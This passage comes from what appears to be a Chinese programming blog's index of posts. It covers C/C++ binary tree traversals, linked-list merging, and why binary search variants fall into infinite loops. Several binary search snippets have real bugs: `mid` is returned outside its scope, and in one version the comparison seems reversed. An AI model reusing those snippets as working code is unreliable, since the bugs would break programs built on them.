TreeNode));<br>BT-&gt;Data = Data;<br>BT-&gt;Left = <span class="hljs-literal">NULL</span>;<br>BT-&gt;Right = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> BT;<br>&#125;<br><br><span class="hljs-comment">// 初始化二叉树 </span><br><span class="hljs-function">BinTree <span class="hljs-title">CreatBinTree</span><span class="hljs-params">()</span></span>&#123;<br>BinTree BT;<br>BT =  (BinTree)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> TreeNode));<br>BT-&gt;Data = <span class="hljs-number">1</span>;<br>BT-&gt;Left = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">2</span>);<br>BT-&gt;Right = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">3</span>);<br>BT-&gt;Left-&gt;Left = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">4</span>);<br>BT-&gt;Left-&gt;Right = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">6</span>);<br>BT-&gt;Left-&gt;Right-&gt;Left = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">5</span>);<br>BT-&gt;Right-&gt;Left = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">7</span>);<br>BT-&gt;Right-&gt;Right = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">9</span>);<br>BT-&gt;Right-&gt;Left-&gt;Right = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">8</span>);<br><span class="hljs-keyword">return</span> BT;<br>&#125;<br><br><br><span class="hljs-comment">// 判断树是否为空</span><br><span class="hljs-comment">/*bool  IsEmpty(BinTree BT)&#123;</span><br><span class="hljs-comment">&#125;*/</span><br><br><span class="hljs-comment">// 先序</span><br><span class="hljs-comment">/*void  PreOrderTraversal(BinTree BT)&#123;</span><br><span class="hljs-comment">if(BT)&#123;</span><br><span class="hljs-comment">printf(&quot;%d&quot;,BT-&gt;Data);  // 打印根 </span><br><span class="hljs-comment">PreOrderTraversal(BT-&gt;Left);  // 进入左子树 </span><br><span class="hljs-comment">PreOrderTraversal(BT-&gt;Right);  // 进入右子树 </span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">&#125; */</span><br><br><span class="hljs-comment">// 先序非递归 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PreOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br>BinTree T = BT;<br>Stack S = <span class="hljs-built_in">CreateStack</span>();  <span class="hljs-comment">// 创建并初始化堆栈 S</span><br><span class="hljs-keyword">while</span>(T || !<span class="hljs-built_in">IsEmpty</span>(S))&#123;  <span class="hljs-comment">// 当树不为空或堆栈不空 </span><br><span class="hljs-keyword">while</span>(T)&#123;     <br><span class="hljs-built_in">Push</span>(S,T);    <span class="hljs-comment">// 压栈，第一次遇到该结点 </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,T-&gt;Data);  <span class="hljs-comment">// 访问结点</span><br>T = T-&gt;Left;   <span class="hljs-comment">// 遍历左子树 </span><br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-built_in">IsEmpty</span>(S))&#123;  <span class="hljs-comment">// 当堆栈不空 </span><br>T = <span class="hljs-built_in">Pop</span>(S);    <span class="hljs-comment">// 出栈，第二次遇到该结点 </span><br>T = T-&gt;Right;  <span class="hljs-comment">// 访问右结点 </span><br>&#125;<br>&#125; <br>&#125; <br><br><span class="hljs-comment">// 中序递归 </span><br><span class="hljs-comment">/*void InOrderTraversal(BinTree BT)&#123;</span><br><span class="hljs-comment">if(BT)&#123;</span><br><span class="hljs-comment">InOrderTraversal(BT-&gt;Left);  // 进入左子树 </span><br><span class="hljs-comment">printf(&quot;%d&quot;,BT-&gt;Data);  // 打印根 </span><br><span class="hljs-comment">InOrderTraversal(BT-&gt;Right);  // 进入右子树 </span><br><span class="hljs-comment">&#125; </span><br><span class="hljs-comment">&#125; */</span><br><br><span class="hljs-comment">// 中序非递归</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br>BinTree T = BT;<br>Stack S = <span class="hljs-built_in">CreateStack</span>();  <span class="hljs-comment">// 创建并初始化堆栈 S</span><br><span class="hljs-keyword">while</span>(T || !<span class="hljs-built_in">IsEmpty</span>(S))&#123;  <span class="hljs-comment">// 当树不为空或堆栈不空 </span><br><span class="hljs-keyword">while</span>(T)&#123;     <br><span class="hljs-built_in">Push</span>(S,T);    <span class="hljs-comment">// 压栈</span><br>T = T-&gt;Left;   <span class="hljs-comment">// 遍历左子树 </span><br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-built_in">IsEmpty</span>(S))&#123;  <span class="hljs-comment">// 当堆栈不空 </span><br>T = <span class="hljs-built_in">Pop</span>(S);    <span class="hljs-comment">// 出栈</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,T-&gt;Data);  <span class="hljs-comment">// 访问结点</span><br>T = T-&gt;Right;  <span class="hljs-comment">// 访问右结点 </span><br>&#125;<br>&#125; <br>&#125; <br><br><span class="hljs-comment">// 后序</span><br><span class="hljs-comment">/*void PostOrderTraversal(BinTree BT)&#123;</span><br><span class="hljs-comment">if(BT)&#123;</span><br><span class="hljs-comment">PostOrderTraversal(BT-&gt;Left);  // 进入左子树 </span><br><span class="hljs-comment">PostOrderTraversal(BT-&gt;Right);  // 进入右子树 </span><br><span class="hljs-comment">printf(&quot;%d&quot;,BT-&gt;Data);  // 打印根 </span><br><span class="hljs-comment">&#125; </span><br><span class="hljs-comment">&#125; */</span> <br><br><span class="hljs-comment">// 后序遍历 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PostOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br>BinTree T = BT;<br>Stack S = <span class="hljs-built_in">CreateStack</span>();  <span class="hljs-comment">// 创建并初始化堆栈 S</span><br>vector&lt;BinTree&gt; v;<br><span class="hljs-built_in">Push</span>(S,T);<br><span class="hljs-keyword">while</span>(!<span class="hljs-built_in">IsEmpty</span>(S))&#123;  <span class="hljs-comment">// 当树不为空或堆栈不空 </span><br>T = <span class="hljs-built_in">Pop</span>(S);<br>v.<span class="hljs-built_in">push_back</span>(T);<br><span class="hljs-keyword">if</span>(T-&gt;Left)<br><span class="hljs-built_in">Push</span>(S,T-&gt;Left);<br><span class="hljs-keyword">if</span>(T-&gt;Right)<br><span class="hljs-built_in">Push</span>(S,T-&gt;Right);<br>&#125;<br><span class="hljs-built_in">reverse</span>(v.<span class="hljs-built_in">begin</span>(),v.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// 逆转 </span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;v.<span class="hljs-built_in">size</span>();i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,v[i]-&gt;Data);<br>&#125; <br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  void PostOrderTraversal(Bintree BT) &#123;  //给节点增加访问次数的属性Visit，初始化为0</span><br><span class="hljs-comment">  Bintree T BT;</span><br><span class="hljs-comment">  Stack S = CreateStack(Maxsize);</span><br><span class="hljs-comment">  while (T || !IsEmpty(S)) &#123;</span><br><span class="hljs-comment">  while (T) &#123;</span><br><span class="hljs-comment">  if (T-&gt;Visit == 0) &#123;//虽然没必要判断，为便于理解</span><br><span class="hljs-comment">  T-&gt;Visit++;</span><br><span class="hljs-comment">  Push(S, T);  //第一次入栈，不访问</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">  T = T-&gt;left;   //转向左子树</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">  if (!IsEmpty(S)) &#123;</span><br><span class="hljs-comment">  T = Pop(s);</span><br><span class="hljs-comment">  if (T-&gt;Visit == 2)    &#123;</span><br><span class="hljs-comment">  printf(&quot;%d&quot;, T-&gt;Data);//第三次碰到它，访问节点，可以彻底从堆栈弹出了</span><br><span class="hljs-comment">  T = NULL;//左右子数均已经访问过</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">  else &#123;</span><br><span class="hljs-comment">  T-&gt;Visit++;</span><br><span class="hljs-comment">  Push(S, T);  //第二次入栈，不访问，（相当于T没有出栈）</span><br><span class="hljs-comment">  T = T-&gt;Right;  //转向右子树</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// 层次遍历</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">LevelOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br>queue&lt;BinTree&gt; q;<br>BinTree T;<br><span class="hljs-keyword">if</span>(!BT)<br><span class="hljs-keyword">return</span>;<br>q.<span class="hljs-built_in">push</span>(BT);  <span class="hljs-comment">// BT 入队 </span><br><span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())&#123;<br>T = q.<span class="hljs-built_in">front</span>();  <span class="hljs-comment">// 访问队首元素 </span><br>q.<span class="hljs-built_in">pop</span>();  <span class="hljs-comment">// 出队</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,T-&gt;Data);<br><span class="hljs-keyword">if</span>(T-&gt;Left)<br>q.<span class="hljs-built_in">push</span>(T-&gt;Left);<br> <span class="hljs-keyword">if</span>(T-&gt;Right)<br> q.<span class="hljs-built_in">push</span>(T-&gt;Right);<br>&#125;<br>&#125;<br><span class="hljs-comment">// 输出叶子结点</span><br><span class="hljs-function"><span class="hljs-type">void</span>  <span class="hljs-title">FindLeaves</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br><span class="hljs-keyword">if</span>(BT)&#123;<br><span class="hljs-keyword">if</span>( !BT-&gt;Left &amp;&amp; !BT-&gt;Right)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,BT-&gt;Data);  <span class="hljs-comment">// 打印叶子结点</span><br><span class="hljs-built_in">FindLeaves</span>(BT-&gt;Left);  <span class="hljs-comment">// 进入左子树 </span><br><span class="hljs-built_in">FindLeaves</span>(BT-&gt;Right);  <span class="hljs-comment">// 进入右子树 </span><br>&#125;<br>&#125; <br><br><span class="hljs-comment">// 求树高度</span><br><span class="hljs-function"><span class="hljs-type">int</span>  <span class="hljs-title">GetHeight</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br><span class="hljs-type">int</span> hl,hr,maxh;<br><span class="hljs-keyword">if</span>(BT)&#123;<br>hl = <span class="hljs-built_in">GetHeight</span>(BT-&gt;Left);  <span class="hljs-comment">// 求左子树高度 </span><br>hr = <span class="hljs-built_in">GetHeight</span>(BT-&gt;Right);  <span class="hljs-comment">// 求右子树高度 </span><br>maxh = (hl&gt;hr)?hl:hr;<br><span class="hljs-keyword">return</span> maxh<span class="hljs-number">+1</span>;  <span class="hljs-comment">// 当前结点高度为左右子树最大的高度+1 </span><br>&#125;<span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>BinTree BT,ST;<br>BT = <span class="hljs-built_in">CreatBinTree</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;先序遍历：&quot;</span>);<br><span class="hljs-built_in">PreOrderTraversal</span>(BT);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n中序遍历：&quot;</span>);<br><span class="hljs-built_in">InOrderTraversal</span>(BT);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n后序遍历：&quot;</span>);<br><span class="hljs-built_in">PostOrderTraversal</span>(BT);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n层次遍历：&quot;</span>);<br><span class="hljs-built_in">LevelOrderTraversal</span>(BT);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n输出叶子结点:&quot;</span>); <br><span class="hljs-built_in">FindLeaves</span>(BT);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n输出树的高度：%d&quot;</span>,<span class="hljs-built_in">GetHeight</span>(BT));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>树</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-链表</title>
    <link href="/dong.github/2024/09/07/Datastructures-%E9%93%BE%E8%A1%A8/"/>
    <url>/dong.github/2024/09/07/Datastructures-%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>还记得他怎么说？“更重要的是，知道如何调整这样一种结构”</strong></p><span id="more"></span>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>例题:链表的输入输出与合并      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *PtrToNode;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>&#123;<br>ElementType Data;<br>PtrToNode Next;<br>&#125;;<br><span class="hljs-keyword">typedef</span> PtrToNode List ;<br><br><span class="hljs-function">List <span class="hljs-title">Read</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(List L)</span></span>;<br><span class="hljs-function">List <span class="hljs-title">Merge</span><span class="hljs-params">(List L1,List L2)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>List L1,L2,L;<br>L1 = <span class="hljs-built_in">Read</span>();<br>L2 = <span class="hljs-built_in">Read</span>();<br>    <span class="hljs-built_in">Print</span>(L1);<br>    <span class="hljs-built_in">Print</span>(L2);<br>L = <span class="hljs-built_in">Merge</span>(L1,L2);<br><span class="hljs-built_in">Print</span>(L);<br><span class="hljs-built_in">Print</span>(L1);<br><span class="hljs-built_in">Print</span>(L2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">List <span class="hljs-title">Read</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>List L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>List head = L;<br><span class="hljs-type">int</span> n;cin &gt;&gt; n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)<br>&#123;<br><span class="hljs-type">int</span> data;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;data);<br>List X = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>X-&gt;Data = data;<br>L-&gt;Next = X;<br>L = L-&gt;Next;<br>&#125;<br>L-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(List L)</span></span><br><span class="hljs-function"></span>&#123;<br>List t = L-&gt;Next;<br><span class="hljs-keyword">if</span>(t==<span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL&quot;</span>);<br>&#125;<br><span class="hljs-keyword">for</span>(;t;t=t-&gt;Next)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,t-&gt;Data);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//if(L-&gt;Next = NULL)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//printf(&quot;NULL&quot;);</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//while(L-&gt;Next!=NULL)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//printf(&quot;%d&quot;,L-&gt;Next-&gt;Data);</span><br><span class="hljs-comment">//L = L-&gt;Next;</span><br><span class="hljs-comment">//&#125;</span><br>&#125;<br><span class="hljs-function">List <span class="hljs-title">Merge</span><span class="hljs-params">(List L1,List L2)</span></span><br><span class="hljs-function"></span>&#123;<br>List L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>List head = L;<br>List tmpL1 = L1-&gt;Next;<br>List tmpL2 = L2-&gt;Next;<br><span class="hljs-keyword">while</span>(tmpL1 &amp;&amp; tmpL2)<br>&#123;<br><span class="hljs-keyword">if</span>(tmpL1-&gt;Data &lt; tmpL2-&gt;Data)&#123;<br>L-&gt;Next = tmpL1;<br>tmpL1 = tmpL1-&gt;Next;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>L-&gt;Next = tmpL2;<br>tmpL2 = tmpL2-&gt;Next;<br>&#125;<br>L = L-&gt;Next;<br>&#125;<br><span class="hljs-keyword">if</span>(tmpL1)<br>&#123;<br>L-&gt;Next = tmpL1;<br>&#125;<br><span class="hljs-keyword">if</span>(tmpL2)<br>&#123;<br>L-&gt;Next = tmpL2;<br>&#125;<br>L1-&gt;Next = <span class="hljs-literal">NULL</span>;<br>L2-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><span class="hljs-comment">//为什么像注释中那样写就无法输出？</span><br><span class="hljs-comment">//为什么要专门留一个head结点（哑结点）不存数据？</span><br><span class="hljs-comment">//如何理解这个合并过程？重组or复制？</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Algorithms-二分</title>
    <link href="/dong.github/2024/09/06/Algorithms-%E4%BA%8C%E5%88%86/"/>
    <url>/dong.github/2024/09/06/Algorithms-%E4%BA%8C%E5%88%86/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>二分法太常用了，学了又忘，忘了再来吧。</strong></p><span id="more"></span><h1 id="整数集合上二分"><a href="#整数集合上二分" class="headerlink" title="整数集合上二分"></a>整数集合上二分</h1><p><strong>二分难在版本太多了，用起来总是让人头晕，比如：</strong><br>Binary_search1:<br><img src="/dong.github/images/0907.jpg"><br><strong>又如：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Binary_search2</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span>(l &lt;= r)<br>&#123;<br><span class="hljs-type">int</span> mid=(l+r)/<span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span>(a[mid]&gt;=x) l=mid<span class="hljs-number">+1</span>;<br><span class="hljs-keyword">else</span> r=mid<span class="hljs-number">-1</span>; <br>&#125;<br><span class="hljs-keyword">return</span> mid;<br>&#125; <br></code></pre></td></tr></table></figure><p><strong>还有：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Binary_search3</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span>(l &lt; r)<br>&#123;<br><span class="hljs-type">int</span> mid=(l+r)/<span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span>(a[mid]&gt;x) l=mid<span class="hljs-number">+1</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a[mid] &lt; x)r=mid<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> mid;<br>&#125; <br></code></pre></td></tr></table></figure><p><strong>为什么会出现这么多版本方法？</strong><br><strong>究其原因，是因为：</strong><br><strong>首先，二分法是一种不断逼近的算法，不断在实数域上逼近一个答案，然而，由于计算机的整除是下取整的，这就会导致这个算法在实现上并不会尽如人意。所有的版本都是在避免一种情况：死循环。</strong></p><p><strong>三个版本都是对同一种情况的不同解决办法，下面逐一考虑：</strong></p><h2 id="考虑Binary-search1"><a href="#考虑Binary-search1" class="headerlink" title="考虑Binary_search1:"></a>考虑Binary_search1:</h2><p><strong>这个代码不对称？求大于等于和求小于等于写法不同？为什么？</strong><br><strong>感觉这个版本是最难的，但是，理解这个代码为什么会这样写，是对彻底理解二分死循环帮助最大的。</strong></p><p><strong>自然地，二分，mid&#x3D;(l+r)&#x2F;2，要取正中间才对（理论上），可是实际上是这样吗？</strong><br><strong>考虑这种情况：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">while</span>(l &lt; r)&#123;<br><span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(a[mid] &lt;= x)l = mid;<span class="hljs-keyword">else</span> r = mid - <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>l &#x3D; r - 1<br>mid &#x3D; (l + r) &#x2F; 2<br>mid &#x3D; l(下取整)<br>a[mid] &lt;&#x3D; x<br>l &#x3D; mid &#x3D; l<br>mid &#x3D; (l + r) &#x2F; 2<br>a[mid] &lt;&#x3D; x<br>l &#x3D; mid<br>…………死循环</p><h3 id="那怎么改呢，让mid-l-r-1-2，变成了上取整，于是就有了Binary-search1"><a href="#那怎么改呢，让mid-l-r-1-2，变成了上取整，于是就有了Binary-search1" class="headerlink" title="那怎么改呢，让mid&#x3D;(l+r+1)&#x2F;2，变成了上取整，于是就有了Binary_search1"></a>那怎么改呢，让mid&#x3D;(l+r+1)&#x2F;2，变成了上取整，于是就有了Binary_search1</h3><h3 id="那怎么改呢，让循环条件l"><a href="#那怎么改呢，让循环条件l" class="headerlink" title="那怎么改呢，让循环条件l&lt;&#x3D;r，l&#x3D;mid-1，让两个指针错过后取中间，于是就有了Binary_search2"></a>那怎么改呢，让循环条件l&lt;&#x3D;r，l&#x3D;mid-1，让两个指针错过后取中间，于是就有了Binary_search2</h3><h3 id="那怎么改呢，让循环条件不变，单独考虑a-mid-x时，再加一个else分支判断一下，于是就有了Binary-search3"><a href="#那怎么改呢，让循环条件不变，单独考虑a-mid-x时，再加一个else分支判断一下，于是就有了Binary-search3" class="headerlink" title="那怎么改呢，让循环条件不变，单独考虑a[mid]&#x3D;x时，再加一个else分支判断一下，于是就有了Binary_search3"></a>那怎么改呢，让循环条件不变，单独考虑a[mid]&#x3D;x时，再加一个else分支判断一下，于是就有了Binary_search3</h3><h2 id="没明白？"><a href="#没明白？" class="headerlink" title="没明白？"></a>没明白？</h2><p><strong>可是现在还是没明白为什么b1要分情况两种写法，而b2,b3只需一种写法即可。</strong><br><strong>打个比方，三个方法都在设计夹子夹住答案，而b1就是设计了一把不对称的夹子，或左大右小（下取整），或左小右大（上取整）</strong><br><strong>另外两种夹子写起来是对称的，所以省心些。</strong></p><h2 id="还是没明白？"><a href="#还是没明白？" class="headerlink" title="还是没明白？"></a>还是没明白？</h2><p><strong>可是现在还没明白为什么一会上取整，一会又下取整？</strong><br><strong>其实二分法本身就不对称，答案是一个整数，要么从左边趋近它，要么从右边趋近它，这就要考虑不同情况。</strong></p><h2 id="就是想用basesearch1？"><a href="#就是想用basesearch1？" class="headerlink" title="就是想用basesearch1？"></a>就是想用basesearch1？</h2><p><strong>《算法竞赛-进阶指南》给出了指导意见：</strong><br><img src="/dong.github/images/0907-1.jpg"></p><h2 id="例题：线性表整数二分查找"><a href="#例题：线性表整数二分查找" class="headerlink" title="例题：线性表整数二分查找"></a>例题：线性表整数二分查找</h2>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">        <div class="fold-arrow">▶</div>title:code      </div>      <div class="fold-collapse collapse" id="collapse-9c51fa20">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 